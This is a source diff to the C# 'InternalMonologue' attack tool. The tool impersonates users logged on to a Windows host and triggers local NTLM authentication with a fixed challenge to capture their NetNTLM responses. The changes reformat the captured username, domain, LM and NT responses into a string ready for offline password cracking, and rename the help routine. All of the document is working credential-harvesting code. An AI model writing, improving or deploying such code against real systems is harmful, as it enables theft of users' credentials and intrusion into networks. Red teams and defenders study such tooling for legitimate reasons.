@@ -237,11 +237,11 @@ namespace InternalMonologue
                                 using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                                 {
                                     if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                                    string result = ByteArrayToString(InternalMonologueForCurrentUser(challenge));
+                                    string result = InternalMonologueForCurrentUser(challenge);
                                     //Ensure it is a valid response and not blank
                                     if (result != null && result.Length > 0)
                                     {
-                                        Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge + ":" + result);
+                                        Console.WriteLine(result);
                                         authenticatedUsers.Add(SID);
                                     }
                                     else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
@@ -307,11 +307,11 @@ namespace InternalMonologue
                                 using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                                 {
                                     if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                                    string result = ByteArrayToString(InternalMonologueForCurrentUser(challenge));
+                                    string result = InternalMonologueForCurrentUser(challenge);
                                     //Ensure it is a valid response and not blank
                                     if (result != null && result.Length > 0)
                                     {
-                                        Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge + ":" + result);
+                                        Console.WriteLine(result);
                                         authenticatedUsers.Add(SID);
                                     }
                                     else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
@@ -352,10 +352,10 @@ namespace InternalMonologue
         {
             Console.WriteLine();
             Console.WriteLine("Error: " + message);
-            PrintMenu();
+            PrintHelp();
         }
 
-        private static void PrintMenu()
+        private static void PrintHelp()
         {
             Console.WriteLine();
             Console.WriteLine("Usage:");
@@ -381,8 +381,13 @@ namespace InternalMonologue
 
             if (args.Length > 0 && argDict.Count == 0)
             {
-                PrintMenu();
+                PrintHelp();
                 return;
+            }
+            else if (args.Length == 0)
+            {
+                Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");
+
             }
 
             if (argDict.ContainsKey("impersonate"))
@@ -460,7 +465,7 @@ namespace InternalMonologue
                 else
                 {
                     if (verbose == true) Console.WriteLine("Performing attack on current user only (no impersonation)");
-                    Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge + ":" + ByteArrayToString(InternalMonologueForCurrentUser(challenge)));
+                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
                 }
 
                 if (downgrade == true && restore == true)
@@ -474,12 +479,12 @@ namespace InternalMonologue
             {
                 //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
                 if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on current user");
-                Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge +":" + ByteArrayToString(InternalMonologueForCurrentUser(challenge)));
+                Console.WriteLine(InternalMonologueForCurrentUser(challenge));
             }           
         }
 
         //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
-        private static byte[] InternalMonologueForCurrentUser(string challenge)
+        private static string InternalMonologueForCurrentUser(string challenge)
         {
             SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
 
@@ -546,17 +551,40 @@ namespace InternalMonologue
             ServerToken.Dispose();
 
             //Extract the NetNTLM response from a type-3 message and return it
-            return ParseNTResponse(result);
+            return ParseNTResponse(result, challenge);
         }
 
         //This function parses the NetNTLM response from a type-3 message
-        private static byte[] ParseNTResponse(byte[] message)
+        private static string ParseNTResponse(byte[] message, string challenge)
         {
+            short lm_resp_len = Convert.ToInt16(message[12] + message[13] * 256);
+            short lm_resp_off = Convert.ToInt16(message[16] + message[17] * 256);
             short nt_resp_len = Convert.ToInt16(message[20] + message[21] * 256);
             short nt_resp_off = Convert.ToInt16(message[24] + message[25] * 256);
+            short domain_len = Convert.ToInt16(message[28] + message[29] * 256);
+            short domain_off = Convert.ToInt16(message[32] + message[33] * 256);
+            short user_len = Convert.ToInt16(message[36] + message[37] * 256);
+            short user_off = Convert.ToInt16(message[40] + message[41] * 256);
+            byte[] lm_resp = new byte[lm_resp_len];
             byte[] nt_resp = new byte[nt_resp_len];
+            byte[] domain = new byte[domain_len];
+            byte[] user = new byte[user_len];
+            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
             Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
-            return nt_resp;
+            Array.Copy(message, domain_off, domain, 0, domain_len);
+            Array.Copy(message, user_off, user, 0, user_len);
+
+            string result = null;
+            if (nt_resp_len == 24)
+            {
+                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
+            }
+            else if (nt_resp_len > 24)
+            {
+                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0,32) + ":" + ByteArrayToString(nt_resp).Substring(32);
+            }
+            
+            return result;
         }
 
         //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
@@ -595,6 +623,27 @@ namespace InternalMonologue
         {
             int val = (int)hex;
             return val - (val < 58 ? 48 : 55);
+        }
+
+        //This function is taken from https://stackoverflow.com/questions/5613279/c-sharp-hex-to-ascii
+        public static string ConvertHex(String hexString)
+        {
+            string ascii = string.Empty;
+
+            for (int i = 0; i < hexString.Length; i += 2)
+            {
+                String hs = string.Empty;
+
+                hs = hexString.Substring(i, 2);
+                if (hs == "00")
+                    continue;
+                uint decval = System.Convert.ToUInt32(hs, 16);
+                char character = System.Convert.ToChar(decval);
+                ascii += character;
+
+            }
+
+            return ascii;         
         }
     }
 
